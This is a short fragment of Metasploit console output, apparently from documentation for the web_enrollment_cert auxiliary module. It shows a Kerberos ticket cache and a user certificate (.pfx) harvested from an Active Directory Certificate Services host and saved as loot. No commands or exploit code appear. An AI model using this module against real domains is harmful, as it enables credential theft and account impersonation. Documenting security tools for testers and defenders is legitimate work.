[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116151147_default_10.5.132.180_mit.kerberos.cca_241072.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate for  using template User saved to /home/tmoose/.msf4/loot/20260116151147_default_10.5.132.180_windows.ad.cs_115992.pfx
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(admin/http/web_enrollment_cert) > 




```

